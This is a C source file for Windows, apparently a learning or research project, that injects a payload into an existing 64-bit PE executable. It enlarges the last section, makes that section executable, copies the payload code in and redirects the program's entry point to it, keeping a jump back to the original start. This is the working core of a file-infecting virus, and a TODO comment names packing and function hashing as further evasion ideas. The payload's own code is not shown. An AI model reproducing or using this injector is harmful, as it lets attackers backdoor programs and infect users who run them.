#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include "payload.h"
#include "utils.h"

#define DWQUAD(x) ((x).QuadPart)
#define DWHIGH(x) ((x).HighPart)
#define DWLOW(x) ((x).LowPart)
#define DWHILO(x) DWHIGH(x), DWLOW(x)

#define PAGE_ALIGN(x, size) (((x) + (size - 1)) & ~(size - 1))

typedef CONST BYTE* PCBYTE;

// TODO: Inject into end of .text, between virtsize and rawsize (unused space)
// Ideas: Packing, unpacking, function hashing

EXTERN_C_START
extern VOID payload();
extern LONGLONG delta2start;
extern LONGLONG to_c_code;
extern ULONGLONG __end_code;
EXTERN_C_END

VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pMapAddress, IN CONST PBYTE pPayload,
                   IN CONST DWORD dwPayloadSize) {
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS64 pNtHeader;
    WORD wNbSections;
    PIMAGE_SECTION_HEADER pSection, pLastSection;
    DWORD dwFileAlignment, dwLastSectionPtr, dwLastSectionSize, dwOrigEntryPoint, dwNewEntryPoint;

    pDosHeader = (PIMAGE_DOS_HEADER)pMapAddress;
    pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)pDosHeader + pDosHeader->e_lfanew);
    wNbSections = pNtHeader->FileHeader.NumberOfSections;
    pSection = IMAGE_FIRST_SECTION(pNtHeader);
    dwFileAlignment = pNtHeader->OptionalHeader.FileAlignment;
    printf("File alignment: %#x (%u)\n", dwFileAlignment, dwFileAlignment);

    pLastSection = &pSection[wNbSections - 1];
    dwLastSectionPtr = pLastSection->PointerToRawData;
    dwLastSectionSize = pLastSection->SizeOfRawData;
    dwOrigEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
    printf("Entry point: %#010x\n", dwOrigEntryPoint);
    printf("Last section: %s\n", pLastSection->Name);
    printf("Last section pointer: %#010x\n", dwLastSectionPtr);
    printf("Last section raw size: %#x (%u)\n", dwLastSectionSize, dwLastSectionSize);
    printf("Last section virtsize: %#x (%u)\n", pLastSection->Misc.VirtualSize,
           pLastSection->Misc.VirtualSize);
    printf("Size of code: %u\n", pNtHeader->OptionalHeader.SizeOfCode);

    pLastSection->Misc.VirtualSize += dwPayloadSize;
    // DWORD dwNewSize = PAGE_ALIGN(pLastSection->Misc.VirtualSize, dwFileAlignment);
    // printf("New size: %#x (%u)\n", dwNewSize, dwNewSize);
    pLastSection->SizeOfRawData += dwPayloadSize;
    pNtHeader->OptionalHeader.SizeOfCode += dwPayloadSize;
    pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE;
    printf("New raw size: %#x (%u)\n", pLastSection->SizeOfRawData, pLastSection->SizeOfRawData);
    printf("New virtsize: %#x (%u)\n", pLastSection->Misc.VirtualSize,
           pLastSection->Misc.VirtualSize);
    printf("New size of code: %u\n", pNtHeader->OptionalHeader.SizeOfCode);

    dwNewEntryPoint = pLastSection->VirtualAddress + dwLastSectionSize;
    pNtHeader->OptionalHeader.AddressOfEntryPoint = dwNewEntryPoint;
    printf("New entry point: %#010x\n", dwNewEntryPoint);

    DWORD dwOldProtect;
    VirtualProtect(&delta2start, sizeof(delta2start), PAGE_READWRITE, &dwOldProtect);
    delta2start = (LONGLONG)dwOrigEntryPoint - (LONGLONG)dwNewEntryPoint;
    VirtualProtect(&delta2start, sizeof(delta2start), dwOldProtect, &dwOldProtect);
    printf("delta2start: %#018llx (%lld)\n", delta2start, delta2start);

    printf("New payload:\n");
    HexDump(pPayload, dwPayloadSize);

    memcpy((PUCHAR)pMapAddress + dwLastSectionPtr + dwLastSectionSize, pPayload, dwPayloadSize);
}

int main(int argc, char* argv[]) {
    int ret = 0;
    HANDLE hFile, hMapFile;
    LPVOID pMapAddress;
    DWORD dwFileSize, dwPayloadSize;
    ULARGE_INTEGER uliSize, uliOffset;

    dwPayloadSize = (DWORD)((PBYTE)&__end_code - (PBYTE)&payload + sizeof(LONGLONG));
    printf("Payload size: %u\n", dwPayloadSize);
    printf("Payload: %p\n", payload);
    HexDump((PCBYTE)payload, dwPayloadSize);

    if (argc < 2) {
        fprintf(stderr, "Usage: %s <filename.exe>\n", argv[0]);
        ret = 1;
        goto exit;
    }

    printf("Reading file: %s\n", argv[1]);

    hFile = CreateFile(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PrintError("CreateFile");
        ret = 1;
        goto exit;
    }

    dwFileSize = GetFileSize(hFile, NULL);
    printf("File size: %u bytes\n", dwFileSize);
    DWQUAD(uliSize) = dwFileSize + dwPayloadSize;

    hMapFile = CreateFileMapping(hFile, NULL, PAGE_READWRITE, DWHILO(uliSize), NULL);
    if (hMapFile == NULL) {
        PrintError("CreateFileMapping");
        ret = 1;
        goto close_file;
    }

    DWQUAD(uliOffset) = 0;
    pMapAddress = MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, DWHILO(uliOffset), 0);
    if (pMapAddress == NULL) {
        PrintError("MapViewOfFile");
        ret = 1;
        goto close_map;
    }

    DWORD dwOldProtect;
    VirtualProtect(&__end_code, sizeof(__end_code), PAGE_READWRITE, &dwOldProtect);
    __end_code = dwPayloadSize;
    VirtualProtect(&__end_code, sizeof(__end_code), dwOldProtect, &dwOldProtect);

    VirtualProtect(&to_c_code, sizeof(to_c_code), PAGE_READWRITE, &dwOldProtect);
    to_c_code = (PBYTE)&inj_code_c - (PBYTE)&payload;
    VirtualProtect(&to_c_code, sizeof(to_c_code), dwOldProtect, &dwOldProtect);

    printf("[*] Injecting payload...\n");
    InjectPayload((PIMAGE_DOS_HEADER)pMapAddress, (PBYTE)payload, dwPayloadSize);
    printf("[*] Injection complete!\n");

    FlushViewOfFile(pMapAddress, 0);
    UnmapViewOfFile(pMapAddress);
close_map:
    CloseHandle(hMapFile);
close_file:
    CloseHandle(hFile);
exit:
    return ret;
}
